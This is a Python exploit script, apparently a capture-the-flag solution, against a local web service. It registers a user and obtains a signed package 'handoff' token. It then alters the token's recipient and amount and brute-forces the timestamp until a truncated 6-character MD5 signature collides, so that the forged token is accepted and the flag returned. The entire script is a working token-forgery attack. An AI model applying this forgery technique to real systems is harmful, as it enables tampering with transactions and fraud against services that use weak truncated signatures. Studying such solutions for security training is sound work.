#!/usr/bin/env python3

import requests
import random
import string
import base64
import json
import hashlib
from typing import Any

target = "http://localhost:3000"

s = requests.Session()

username = "".join(random.choices(string.ascii_uppercase, k=8))

reg = s.post(f"{target}/api/register", json={"username": username, "password": "123", "email": "123"})
login = s.post(f"{target}/api/login", json={"username": username, "password": "123"})
token = login.json()['token']
s.headers = {"Authorization": f"Bearer {token}"}

create_package = s.post(
    f"{target}/api/create-package",
    json={
        "recipientAddress": "1337",
        "amount": "1",
    }
)
handoff = create_package.json()['handoff']

payload = handoff.split('.')[1]
data = json.loads(base64.b64decode(payload).decode())


def data_to_sig(data: Any):
    return "|".join((data['sender'], data['recipient'], data['amount'], str(data['timestamp'])))


sig_target = hashlib.md5(data_to_sig(data).encode()).hexdigest()[:6]

data['recipient'] = "1337133713371337133713371337133713371337133713371337133713371337"
data['amount'] = '133713371337'

while hashlib.md5(data_to_sig(data).encode()).hexdigest()[:6] != sig_target:
    data['timestamp'] = "".join(random.choices(string.ascii_letters, k=16))

bad_handoff = '.'.join((handoff.split('.')[0], base64.b64encode(json.dumps(data).encode()).decode(), ''))
print(f'{bad_handoff = }')

flag = s.post(f'{target}/api/get-flag', json={"handoff": bad_handoff})
print(flag.json()['flag'])
